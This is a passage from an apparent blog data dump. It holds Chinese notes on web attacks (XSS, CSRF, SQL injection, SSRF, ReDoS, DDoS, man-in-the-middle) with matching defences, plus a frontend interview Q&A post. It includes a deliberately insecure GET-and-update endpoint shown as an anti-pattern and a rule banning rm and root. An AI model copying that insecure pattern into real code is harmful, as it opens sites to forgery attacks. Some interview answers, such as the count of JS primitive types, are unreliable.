class=\"hljs-deletion\">-不同的浏览器，会有区别（按照浏览器进行攻击）</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/2db16e9e30d05689.jpg\"></p>\n<p>Note：其实就是闭合双引号；</p>\n<h2 id=\"二、Cross-site-request-forgery-CSRF-跨站伪造请求\"><a href=\"#二、Cross-site-request-forgery-CSRF-跨站伪造请求\" class=\"headerlink\" title=\"二、Cross-site request forgery(CSRF)跨站伪造请求\"></a>二、Cross-site request forgery(CSRF)跨站伪造请求</h2><h3 id=\"1-特点\"><a href=\"#1-特点\" class=\"headerlink\" title=\"1.特点\"></a>1.特点</h3><ul>\n<li>在用户不知情的前提下</li>\n<li>利用用户权限Cookie</li>\n<li>构造指定HTTP请求，窃取或者修改用户敏感信息</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/1cb69b1cdfc1f80f.jpg\"></p>\n<h3 id=\"2-Get请求\"><a href=\"#2-Get请求\" class=\"headerlink\" title=\"2.Get请求\"></a>2.Get请求</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/315569b1ad5267c7.jpg\"></p>\n<h2 id=\"三、注入\"><a href=\"#三、注入\" class=\"headerlink\" title=\"三、注入\"></a>三、注入</h2><h3 id=\"1-SQL-Injection\"><a href=\"#1-SQL-Injection\" class=\"headerlink\" title=\"1.SQL Injection\"></a>1.SQL Injection</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/bdfe27a1758bff45.jpg\"></p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/d8d8412ddb795269.png\"> </p>\n<h3 id=\"2-更多注入\"><a href=\"#2-更多注入\" class=\"headerlink\" title=\"2.更多注入\"></a>2.更多注入</h3><ul>\n<li>CLI</li>\n<li>OS command</li>\n<li>Server-side Request Forgery(SSRF),服务端伪造请求；严格来说并不是注入，但是原理类似；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/c853331fa801b755.jpg\"></p>\n<h5 id=\"读取-修改\"><a href=\"#读取-修改\" class=\"headerlink\" title=\"读取+修改\"></a>读取+修改</h5><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/d326f66d918f6e14.jpg\"></p>\n<p>SSRF Demo</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/730fd31cf9f769ca.jpg\"></p>\n<h2 id=\"四、DOS\"><a href=\"#四、DOS\" class=\"headerlink\" title=\"四、DOS\"></a>四、DOS</h2><blockquote>\n<p>通过某种方式（构造特定请求），导致服务器资源被消耗殆尽，来不及响应更多请求，导致请求被挤压，进而形成雪崩效应；</p>\n</blockquote>\n<h3 id=\"1-正则表达式——贪婪模式\"><a href=\"#1-正则表达式——贪婪模式\" class=\"headerlink\" title=\"1.正则表达式——贪婪模式\"></a>1.正则表达式——贪婪模式</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> greedyRegExp=<span class=\"hljs-regexp\">/a+/</span>;<br><span class=\"hljs-keyword\">const</span> noGreedyRegExp=<span class=\"hljs-regexp\">/a+?/</span>;<br><span class=\"hljs-keyword\">const</span> str=<span class=\"hljs-string\">&#x27;aaaaaaa&#x27;</span>;<br><br>result1=str.<span class=\"hljs-title function_\">match</span>(greedyRegExp)[<span class=\"hljs-number\">0</span>];\t\t\t<span class=\"hljs-comment\">// &quot;aaaaaaa&quot;</span><br>result2=str.<span class=\"hljs-title function_\">match</span>(noGreedyRegExp)[<span class=\"hljs-number\">0</span>];\t\t<span class=\"hljs-comment\">// &quot;a&quot;</span><br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-ReDOS-基于正则表达式的DoS\"><a href=\"#2-ReDOS-基于正则表达式的DoS\" class=\"headerlink\" title=\"2.ReDOS 基于正则表达式的DoS\"></a>2.ReDOS 基于正则表达式的DoS</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/c28283945d9c0451.jpg\"></p>\n<h3 id=\"3-DDos\"><a href=\"#3-DDos\" class=\"headerlink\" title=\"3.DDos\"></a>3.DDos</h3><blockquote>\n<p>短时间内，来自大量僵尸设备的请求流量，服务器不能及时完成全部请求，导致请求堆积；</p>\n</blockquote>\n<h5 id=\"Logical-DOS\"><a href=\"#Logical-DOS\" class=\"headerlink\" title=\"Logical DOS\"></a>Logical DOS</h5><ul>\n<li>耗时的同步操作</li>\n<li>数据库写入</li>\n<li>SQL join</li>\n<li>文件备份</li>\n<li>循环执行逻辑</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/bade294c53a9fd51.jpg\"></p>\n<h2 id=\"五、中间人攻击\"><a href=\"#五、中间人攻击\" class=\"headerlink\" title=\"五、中间人攻击\"></a>五、中间人攻击</h2><p><img src=\"https://pic.imgdb.cn/item/63e069224757feff33a5d839.jpg\"></p>\n<h1 id=\"防御篇\"><a href=\"#防御篇\" class=\"headerlink\" title=\"防御篇\"></a>防御篇</h1><h2 id=\"一、XSS\"><a href=\"#一、XSS\" class=\"headerlink\" title=\"一、XSS\"></a>一、XSS</h2><h3 id=\"1-防御方法\"><a href=\"#1-防御方法\" class=\"headerlink\" title=\"1.防御方法\"></a>1.防御方法</h3><h5 id=\"原则\"><a href=\"#原则\" class=\"headerlink\" title=\"原则\"></a>原则</h5><ul>\n<li>永远不要相信用户的提交内容</li>\n<li>永远不要将用户提交的内容转换为DOM</li>\n</ul>\n<h5 id=\"前端\"><a href=\"#前端\" class=\"headerlink\" title=\"前端\"></a>前端</h5><ul>\n<li>主流框架默认防御XSS</li>\n<li>googole-closure-library</li>\n</ul>\n<h5 id=\"服务端（Node）\"><a href=\"#服务端（Node）\" class=\"headerlink\" title=\"服务端（Node）\"></a>服务端（Node）</h5><ul>\n<li>DOMPurify</li>\n</ul>\n<h5 id=\"业务需要用户生成DOM\"><a href=\"#业务需要用户生成DOM\" class=\"headerlink\" title=\"业务需要用户生成DOM\"></a>业务需要用户生成DOM</h5><ul>\n<li>需要对string进行转义</li>\n<li>上传的svg文件需要进行扫描</li>\n<li>Blob动态生成script</li>\n<li>自定义样式（自定义背景图片，url）</li>\n</ul>\n<h3 id=\"2-同源策略\"><a href=\"#2-同源策略\" class=\"headerlink\" title=\"2.同源策略\"></a>2.同源策略</h3><ul>\n<li>协议、域名、端口号完全相同；</li>\n</ul>\n<h3 id=\"3-CSP（content-security-policy）\"><a href=\"#3-CSP（content-security-policy）\" class=\"headerlink\" title=\"3.CSP（content security policy）\"></a>3.CSP（content security policy）</h3><ul>\n<li>那些源认为是安全的</li>\n<li>对来自安全源的脚本可以执行，否则直接抛错</li>\n<li>对eval+inline script 说No！！！！</li>\n</ul>\n<p><img src=\"https://pic.imgdb.cn/item/63e06b684757feff33a91d70.jpg\"></p>\n<h2 id=\"二、CSRF\"><a href=\"#二、CSRF\" class=\"headerlink\" title=\"二、CSRF\"></a>二、CSRF</h2><p><img src=\"https://pic.imgdb.cn/item/63e06ba14757feff33a96e53.jpg\"></p>\n<h5 id=\"token\"><a href=\"#token\" class=\"headerlink\" title=\"token\"></a>token</h5><p><img src=\"https://pic.imgdb.cn/item/63e06bed4757feff33a9e138.jpg\"></p>\n<h5 id=\"iFrame攻击\"><a href=\"#iFrame攻击\" class=\"headerlink\" title=\"iFrame攻击\"></a>iFrame攻击</h5><p><img src=\"https://pic.imgdb.cn/item/63e06cac4757feff33aaec65.jpg\"></p>\n<blockquote>\n<p>button是none的，所以点击button下穿到了底下的iframe页面；</p>\n</blockquote>\n<h5 id=\"anti-pattern\"><a href=\"#anti-pattern\" class=\"headerlink\" title=\"anti-pattern\"></a>anti-pattern</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//GET!==GET+POST</span><br><span class=\"hljs-comment\">//将更新+获取放到同一个GET接口；</span><br>pulic <span class=\"hljs-keyword\">async</span> <span class=\"hljs-title function_\">getAndUpdate</span>(<span class=\"hljs-params\">ctx</span>)&#123;<br>    <span class=\"hljs-keyword\">const</span>&#123;update,id&#125;=ctx.<span class=\"hljs-property\">query</span>;<br>    <span class=\"hljs-keyword\">if</span>(update)&#123;<br>        <span class=\"hljs-keyword\">await</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">update</span>(update);<br>    &#125;<br>    ctx.<span class=\"hljs-property\">body</span>=<span class=\"hljs-keyword\">await</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">get</span>(id);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"避免用户信息被携带：same-site-cookie\"><a href=\"#避免用户信息被携带：same-site-cookie\" class=\"headerlink\" title=\"避免用户信息被携带：same site cookie\"></a>避免用户信息被携带：same site cookie</h5><p><img src=\"https://pic.imgdb.cn/item/63e06e0e4757feff33ad8660.jpg\"></p>\n<p><img src=\"https://pic.imgdb.cn/item/63e06e224757feff33adb6f3.jpg\"></p>\n<h5 id=\"问题：第三方服务依赖于cookie怎么办？\"><a href=\"#问题：第三方服务依赖于cookie怎么办？\" class=\"headerlink\" title=\"问题：第三方服务依赖于cookie怎么办？\"></a>问题：第三方服务依赖于cookie怎么办？</h5><figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs ruby\"><span class=\"hljs-title class_\">Set</span>-<span class=\"hljs-title class_\">Cookie</span><span class=\"hljs-symbol\">:SameSite=None</span>;<span class=\"hljs-title class_\">Secure</span>;<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic.imgdb.cn/item/63e06eb34757feff33aec45d.jpg\"></p>\n<h2 id=\"三、Injection\"><a href=\"#三、Injection\" class=\"headerlink\" title=\"三、Injection\"></a>三、Injection</h2><ul>\n<li>找到查询SQL的地方</li>\n<li>使用prapared statement</li>\n<li>最小权限原则：禁止sudo || root</li>\n<li>建立允许名单+过滤：禁止rm</li>\n<li>对URL类型参数进行协议、域名、ip等限制：禁止访问内网</li>\n</ul>\n<h2 id=\"四、DOS-1\"><a href=\"#四、DOS-1\" class=\"headerlink\" title=\"四、DOS\"></a>四、DOS</h2><h3 id=\"1-RegexDos\"><a href=\"#1-RegexDos\" class=\"headerlink\" title=\"1.RegexDos\"></a>1.RegexDos</h3><ul>\n<li>code review</li>\n<li>code scan+正则性能测试</li>\n<li>禁止使用用户提供的正则</li>\n</ul>\n<h3 id=\"2-DDoS\"><a href=\"#2-DDoS\" class=\"headerlink\" title=\"2.DDoS\"></a>2.DDoS</h3><ul>\n<li>流量治理：负载均衡、API网关、CDN （过滤）</li>\n<li>快速自动扩容        (抗量)</li>\n<li>非核心服务降级  （抗量）</li>\n</ul>\n<h3 id=\"3-中间人\"><a href=\"#3-中间人\" class=\"headerlink\" title=\"3.中间人\"></a>3.中间人</h3><p><img src=\"https://pic.imgdb.cn/item/63e070324757feff33b1206f.jpg\"></p>\n<ul>\n<li>可靠：加密</li>\n<li>完整：MAC校验</li>\n<li>不可抵赖：数字签名</li>\n</ul>\n<h3 id=\"4-SRI-子资源集成\"><a href=\"#4-SRI-子资源集成\" class=\"headerlink\" title=\"4.SRI  子资源集成\"></a>4.SRI  子资源集成</h3><p>静态资源被劫持篡改？</p>\n<p>对比Hash !!!</p>\n<p><img src=\"https://pic.imgdb.cn/item/63e071574757feff33b2d91a.jpg\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Web开发安全\"><a href=\"#Web开发安全\" class=\"headerlink\" title=\"Web开发安全\"></a>Web开发安全</h1><h1 id=\"攻击篇\"><a href=\"#攻击篇\" class=\"headerlink\" title=\"攻击篇\"></a>攻击篇</h1><h2 id=\"一、Cross-site-Scripting-XSS-跨站脚本攻击\"><a href=\"#一、Cross-site-Scripting-XSS-跨站脚本攻击\" class=\"headerlink\" title=\"一、Cross-site Scripting(XSS)跨站脚本攻击\"></a>一、Cross-site Scripting(XSS)跨站脚本攻击</h2><h3 id=\"1-主要利用点\"><a href=\"#1-主要利用点\" class=\"headerlink\" title=\"1.主要利用点\"></a>1.主要利用点</h3><ul>\n<li>盲目信任用户的提交内容；</li>\n<li>string-&gt;Dom</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">doucument.<span class=\"hljs-property\">write</span><br>element.<span class=\"hljs-property\">innerHTML</span>=anyString<br><span class=\"hljs-title function_\">SSR</span>(user_data)\t<span class=\"hljs-comment\">//伪代码</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-特点\"><a href=\"#2-特点\" class=\"headerlink\" title=\"2.特点\"></a>2.特点</h3><ul>\n<li>很难从UI感知；</li>\n<li>窃取用户信息（Cookie/token）；</li>\n<li>绘制UI（例如弹窗），诱骗用户点击/填写表单；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/bab761782d523687.jpg\"></p>\n<h3 id=\"3-类别\"><a href=\"#3-类别\" class=\"headerlink\" title=\"3.类别\"></a>3.类别</h3><ul>\n<li>stored XSS（存储型xss）</li>\n</ul>\n<figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs diff\"><span class=\"hljs-deletion\">-恶意脚本被存储在数据库中</span><br><span class=\"hljs-deletion\">-访问页面-&gt;读数据-&gt;被攻击</span><br><span class=\"hljs-deletion\">-危害最大，对全部用户可见</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>reflected XSS (反射型xss)</li>\n</ul>\n<figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs diff\"><span class=\"hljs-deletion\">-不涉及数据库</span><br><span class=\"hljs-deletion\">-从URL攻击</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/01aa21181b743218.jpg\"></p>\n<ul>\n<li>DOM-based XSS</li>\n</ul>\n<figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs diff\"><span class=\"hljs-deletion\">-不需要服务器参与</span><br><span class=\"hljs-deletion\">-恶意攻击的发起+执行，全部在浏览器完成</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/8f74704368f2a414.jpg\"></p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/83dda8008e3c1b19.jpg\"></p>\n<ul>\n<li>Mutation-based XSS </li>\n</ul>\n<figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs diff\"><span class=\"hljs-deletion\">-利用浏览器渲染DOM的特性（独特优化）</span><br><span class=\"hljs-deletion\">-不同的浏览器，会有区别（按照浏览器进行攻击）</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/2db16e9e30d05689.jpg\"></p>\n<p>Note：其实就是闭合双引号；</p>\n<h2 id=\"二、Cross-site-request-forgery-CSRF-跨站伪造请求\"><a href=\"#二、Cross-site-request-forgery-CSRF-跨站伪造请求\" class=\"headerlink\" title=\"二、Cross-site request forgery(CSRF)跨站伪造请求\"></a>二、Cross-site request forgery(CSRF)跨站伪造请求</h2><h3 id=\"1-特点\"><a href=\"#1-特点\" class=\"headerlink\" title=\"1.特点\"></a>1.特点</h3><ul>\n<li>在用户不知情的前提下</li>\n<li>利用用户权限Cookie</li>\n<li>构造指定HTTP请求，窃取或者修改用户敏感信息</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/1cb69b1cdfc1f80f.jpg\"></p>\n<h3 id=\"2-Get请求\"><a href=\"#2-Get请求\" class=\"headerlink\" title=\"2.Get请求\"></a>2.Get请求</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/315569b1ad5267c7.jpg\"></p>\n<h2 id=\"三、注入\"><a href=\"#三、注入\" class=\"headerlink\" title=\"三、注入\"></a>三、注入</h2><h3 id=\"1-SQL-Injection\"><a href=\"#1-SQL-Injection\" class=\"headerlink\" title=\"1.SQL Injection\"></a>1.SQL Injection</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/bdfe27a1758bff45.jpg\"></p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/d8d8412ddb795269.png\"> </p>\n<h3 id=\"2-更多注入\"><a href=\"#2-更多注入\" class=\"headerlink\" title=\"2.更多注入\"></a>2.更多注入</h3><ul>\n<li>CLI</li>\n<li>OS command</li>\n<li>Server-side Request Forgery(SSRF),服务端伪造请求；严格来说并不是注入，但是原理类似；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/c853331fa801b755.jpg\"></p>\n<h5 id=\"读取-修改\"><a href=\"#读取-修改\" class=\"headerlink\" title=\"读取+修改\"></a>读取+修改</h5><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/d326f66d918f6e14.jpg\"></p>\n<p>SSRF Demo</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/730fd31cf9f769ca.jpg\"></p>\n<h2 id=\"四、DOS\"><a href=\"#四、DOS\" class=\"headerlink\" title=\"四、DOS\"></a>四、DOS</h2><blockquote>\n<p>通过某种方式（构造特定请求），导致服务器资源被消耗殆尽，来不及响应更多请求，导致请求被挤压，进而形成雪崩效应；</p>\n</blockquote>\n<h3 id=\"1-正则表达式——贪婪模式\"><a href=\"#1-正则表达式——贪婪模式\" class=\"headerlink\" title=\"1.正则表达式——贪婪模式\"></a>1.正则表达式——贪婪模式</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> greedyRegExp=<span class=\"hljs-regexp\">/a+/</span>;<br><span class=\"hljs-keyword\">const</span> noGreedyRegExp=<span class=\"hljs-regexp\">/a+?/</span>;<br><span class=\"hljs-keyword\">const</span> str=<span class=\"hljs-string\">&#x27;aaaaaaa&#x27;</span>;<br><br>result1=str.<span class=\"hljs-title function_\">match</span>(greedyRegExp)[<span class=\"hljs-number\">0</span>];\t\t\t<span class=\"hljs-comment\">// &quot;aaaaaaa&quot;</span><br>result2=str.<span class=\"hljs-title function_\">match</span>(noGreedyRegExp)[<span class=\"hljs-number\">0</span>];\t\t<span class=\"hljs-comment\">// &quot;a&quot;</span><br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-ReDOS-基于正则表达式的DoS\"><a href=\"#2-ReDOS-基于正则表达式的DoS\" class=\"headerlink\" title=\"2.ReDOS 基于正则表达式的DoS\"></a>2.ReDOS 基于正则表达式的DoS</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/c28283945d9c0451.jpg\"></p>\n<h3 id=\"3-DDos\"><a href=\"#3-DDos\" class=\"headerlink\" title=\"3.DDos\"></a>3.DDos</h3><blockquote>\n<p>短时间内，来自大量僵尸设备的请求流量，服务器不能及时完成全部请求，导致请求堆积；</p>\n</blockquote>\n<h5 id=\"Logical-DOS\"><a href=\"#Logical-DOS\" class=\"headerlink\" title=\"Logical DOS\"></a>Logical DOS</h5><ul>\n<li>耗时的同步操作</li>\n<li>数据库写入</li>\n<li>SQL join</li>\n<li>文件备份</li>\n<li>循环执行逻辑</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/bade294c53a9fd51.jpg\"></p>\n<h2 id=\"五、中间人攻击\"><a href=\"#五、中间人攻击\" class=\"headerlink\" title=\"五、中间人攻击\"></a>五、中间人攻击</h2><p><img src=\"https://pic.imgdb.cn/item/63e069224757feff33a5d839.jpg\"></p>\n<h1 id=\"防御篇\"><a href=\"#防御篇\" class=\"headerlink\" title=\"防御篇\"></a>防御篇</h1><h2 id=\"一、XSS\"><a href=\"#一、XSS\" class=\"headerlink\" title=\"一、XSS\"></a>一、XSS</h2><h3 id=\"1-防御方法\"><a href=\"#1-防御方法\" class=\"headerlink\" title=\"1.防御方法\"></a>1.防御方法</h3><h5 id=\"原则\"><a href=\"#原则\" class=\"headerlink\" title=\"原则\"></a>原则</h5><ul>\n<li>永远不要相信用户的提交内容</li>\n<li>永远不要将用户提交的内容转换为DOM</li>\n</ul>\n<h5 id=\"前端\"><a href=\"#前端\" class=\"headerlink\" title=\"前端\"></a>前端</h5><ul>\n<li>主流框架默认防御XSS</li>\n<li>googole-closure-library</li>\n</ul>\n<h5 id=\"服务端（Node）\"><a href=\"#服务端（Node）\" class=\"headerlink\" title=\"服务端（Node）\"></a>服务端（Node）</h5><ul>\n<li>DOMPurify</li>\n</ul>\n<h5 id=\"业务需要用户生成DOM\"><a href=\"#业务需要用户生成DOM\" class=\"headerlink\" title=\"业务需要用户生成DOM\"></a>业务需要用户生成DOM</h5><ul>\n<li>需要对string进行转义</li>\n<li>上传的svg文件需要进行扫描</li>\n<li>Blob动态生成script</li>\n<li>自定义样式（自定义背景图片，url）</li>\n</ul>\n<h3 id=\"2-同源策略\"><a href=\"#2-同源策略\" class=\"headerlink\" title=\"2.同源策略\"></a>2.同源策略</h3><ul>\n<li>协议、域名、端口号完全相同；</li>\n</ul>\n<h3 id=\"3-CSP（content-security-policy）\"><a href=\"#3-CSP（content-security-policy）\" class=\"headerlink\" title=\"3.CSP（content security policy）\"></a>3.CSP（content security policy）</h3><ul>\n<li>那些源认为是安全的</li>\n<li>对来自安全源的脚本可以执行，否则直接抛错</li>\n<li>对eval+inline script 说No！！！！</li>\n</ul>\n<p><img src=\"https://pic.imgdb.cn/item/63e06b684757feff33a91d70.jpg\"></p>\n<h2 id=\"二、CSRF\"><a href=\"#二、CSRF\" class=\"headerlink\" title=\"二、CSRF\"></a>二、CSRF</h2><p><img src=\"https://pic.imgdb.cn/item/63e06ba14757feff33a96e53.jpg\"></p>\n<h5 id=\"token\"><a href=\"#token\" class=\"headerlink\" title=\"token\"></a>token</h5><p><img src=\"https://pic.imgdb.cn/item/63e06bed4757feff33a9e138.jpg\"></p>\n<h5 id=\"iFrame攻击\"><a href=\"#iFrame攻击\" class=\"headerlink\" title=\"iFrame攻击\"></a>iFrame攻击</h5><p><img src=\"https://pic.imgdb.cn/item/63e06cac4757feff33aaec65.jpg\"></p>\n<blockquote>\n<p>button是none的，所以点击button下穿到了底下的iframe页面；</p>\n</blockquote>\n<h5 id=\"anti-pattern\"><a href=\"#anti-pattern\" class=\"headerlink\" title=\"anti-pattern\"></a>anti-pattern</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//GET!==GET+POST</span><br><span class=\"hljs-comment\">//将更新+获取放到同一个GET接口；</span><br>pulic <span class=\"hljs-keyword\">async</span> <span class=\"hljs-title function_\">getAndUpdate</span>(<span class=\"hljs-params\">ctx</span>)&#123;<br>    <span class=\"hljs-keyword\">const</span>&#123;update,id&#125;=ctx.<span class=\"hljs-property\">query</span>;<br>    <span class=\"hljs-keyword\">if</span>(update)&#123;<br>        <span class=\"hljs-keyword\">await</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">update</span>(update);<br>    &#125;<br>    ctx.<span class=\"hljs-property\">body</span>=<span class=\"hljs-keyword\">await</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">get</span>(id);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"避免用户信息被携带：same-site-cookie\"><a href=\"#避免用户信息被携带：same-site-cookie\" class=\"headerlink\" title=\"避免用户信息被携带：same site cookie\"></a>避免用户信息被携带：same site cookie</h5><p><img src=\"https://pic.imgdb.cn/item/63e06e0e4757feff33ad8660.jpg\"></p>\n<p><img src=\"https://pic.imgdb.cn/item/63e06e224757feff33adb6f3.jpg\"></p>\n<h5 id=\"问题：第三方服务依赖于cookie怎么办？\"><a href=\"#问题：第三方服务依赖于cookie怎么办？\" class=\"headerlink\" title=\"问题：第三方服务依赖于cookie怎么办？\"></a>问题：第三方服务依赖于cookie怎么办？</h5><figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs ruby\"><span class=\"hljs-title class_\">Set</span>-<span class=\"hljs-title class_\">Cookie</span><span class=\"hljs-symbol\">:SameSite=None</span>;<span class=\"hljs-title class_\">Secure</span>;<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic.imgdb.cn/item/63e06eb34757feff33aec45d.jpg\"></p>\n<h2 id=\"三、Injection\"><a href=\"#三、Injection\" class=\"headerlink\" title=\"三、Injection\"></a>三、Injection</h2><ul>\n<li>找到查询SQL的地方</li>\n<li>使用prapared statement</li>\n<li>最小权限原则：禁止sudo || root</li>\n<li>建立允许名单+过滤：禁止rm</li>\n<li>对URL类型参数进行协议、域名、ip等限制：禁止访问内网</li>\n</ul>\n<h2 id=\"四、DOS-1\"><a href=\"#四、DOS-1\" class=\"headerlink\" title=\"四、DOS\"></a>四、DOS</h2><h3 id=\"1-RegexDos\"><a href=\"#1-RegexDos\" class=\"headerlink\" title=\"1.RegexDos\"></a>1.RegexDos</h3><ul>\n<li>code review</li>\n<li>code scan+正则性能测试</li>\n<li>禁止使用用户提供的正则</li>\n</ul>\n<h3 id=\"2-DDoS\"><a href=\"#2-DDoS\" class=\"headerlink\" title=\"2.DDoS\"></a>2.DDoS</h3><ul>\n<li>流量治理：负载均衡、API网关、CDN （过滤）</li>\n<li>快速自动扩容        (抗量)</li>\n<li>非核心服务降级  （抗量）</li>\n</ul>\n<h3 id=\"3-中间人\"><a href=\"#3-中间人\" class=\"headerlink\" title=\"3.中间人\"></a>3.中间人</h3><p><img src=\"https://pic.imgdb.cn/item/63e070324757feff33b1206f.jpg\"></p>\n<ul>\n<li>可靠：加密</li>\n<li>完整：MAC校验</li>\n<li>不可抵赖：数字签名</li>\n</ul>\n<h3 id=\"4-SRI-子资源集成\"><a href=\"#4-SRI-子资源集成\" class=\"headerlink\" title=\"4.SRI  子资源集成\"></a>4.SRI  子资源集成</h3><p>静态资源被劫持篡改？</p>\n<p>对比Hash !!!</p>\n<p><img src=\"https://pic.imgdb.cn/item/63e071574757feff33b2d91a.jpg\"></p>\n"},{"title":"YK大佬的面试题","date":"2021-04-12T15:41:10.000Z","mp3":null,"cover":"img/bg10.jpg","_content":"\n\n\n# ##前端面试问题\n\n## 一、JS\n\n1.JS中的基础数据类型：  6种，undefined，null，boolean，string，number，symbol；\n2.let和var的区别\tlet：有作用域，不会出现变量提升，不与全局环境挂钩；\n3.this是什么？\tthis是一种指向，在运行的时候，会指向最后调用它的对象；\n4.怎么判断一个变量是什么数据类型？\t\t\ntypeof，缺点:只能判断基础数据类型，对于检测对象以及数组乏力； instanceof：为了解决前面的问题，它可以判断一个对象是不是数组； object。prototype。toString。call（检测对象）；\n5.ajax\t局部更新不刷新整个页面；\n6.promise基本了解\t\t\t为了解决ajax回调地域的问题，下一个请求依赖上一个请求返回的数据，会造成这；promise支持链式调用，所以能解决这个问题；\n7.async/await\t\t\t将异步的代码写出同步的风格，就是一个语法糖；promise+generator的语法糖；\n8.dom操作有哪些？\t\t\t\n\n\n\n## 二、CSS\n\n1.居中，块级和行内      \n行内：text-align：center；  \n块级：首先定义宽度，margin：0，auto；  \n其他方法：父元素display设为flex。加上一句话:justify-content；center；\n2.垂直居中  \n父元素display设为flex。加上一句话:justify-content；center；align-items：center；\n3.float布局以及缺点，文档流；   \n缺点：最开始用来解决文本围绕图片问题，但是有一个缺点，会造成父元素高度塌陷，因为脱离了文档流；\n4.position的属性有哪些？    \nabosulte:绝对定位  子元素位置根据父元素决定           \nfixed:固定定位     跟据浏览器决定 ， \nrelative：相对定位 根据应该出现的位置定位；\n5.flex布局          是一个弹性的伸缩盒子模型\n\n## 三、vue\n\n1.组件通信\n2.为什么子组件的数据需要用函数形式，根组件不用；\n3.computed/watch的用法和区别；\n4.router了解","source":"_posts/前端.md","raw":"---\ntitle: YK大佬的面试题\ndate: 2021-04-12 23:41:10\ncategories: \n    - 前端\ntags: \n    - 面试\n    - 笔记\nmp3: \ncover: img/bg10.jpg\n---\n\n\n\n# ##前端面试问题\n\n## 一、JS\n\n1.JS中的基础数据类型：  